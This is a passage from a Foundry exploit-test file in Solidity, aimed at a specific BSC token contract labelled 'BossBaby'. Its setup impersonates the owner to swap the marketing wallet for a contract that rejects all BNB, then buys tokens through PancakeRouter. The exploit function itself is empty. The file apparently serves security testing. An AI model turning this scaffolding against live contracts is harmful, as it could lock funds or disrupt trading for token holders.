    function owner() external view returns (address);
    function changeMarketingWallet(address _marketingWallet) external;
    function enableTrading() external;
    function uniswapV2Pair() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function claimStuckTokens(address token) external;
}

contract MaliciousMarketingWallet {
    receive() external payable {
        revert("Malicious wallet: no BNB accepted");
    }
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xD8dBE5AC60cD1c0b40C9182cB3eB2392d3df371F;
    address attacker = address(this);

    IUniswapV2Router02 router;
    address weth;
    address owner;
    address[] path;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        // Create malicious marketing wallet
        MaliciousMarketingWallet maliciousWallet = new MaliciousMarketingWallet();

        // Label addresses for debugging
        vm.label(address(maliciousWallet), "MaliciousMarketingWallet");
        vm.label(TARGET, "BossBaby");

        // Get the current owner of the contract
        address owner = BossBaby(TARGET).owner();
        vm.label(owner, "Original Owner");

        // Impersonate owner to change marketing wallet
        vm.startPrank(owner);
        BossBaby(TARGET).changeMarketingWallet(address(maliciousWallet));
        // Don't call enableTrading() - it's already enabled
        vm.stopPrank();

        // Get some initial BNB for buying tokens
        deal(attacker, 10 ether);

        // Get the uniswap pair address
        address pair = BossBaby(TARGET).uniswapV2Pair();
        vm.label(pair, "Uniswap Pair");

        // Get WETH address from router (needed for swapping)
        address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeRouter on BSC
        router = IUniswapV2Router02(routerAddress);
        weth = router.WETH();

        // Approve router to spend attacker's BNB
        vm.startPrank(attacker);

        // Buy some BossBaby tokens via swapExactETHForTokens
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1 ether}(
            0,
            path,
            attacker,
            block.timestamp
        );

        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

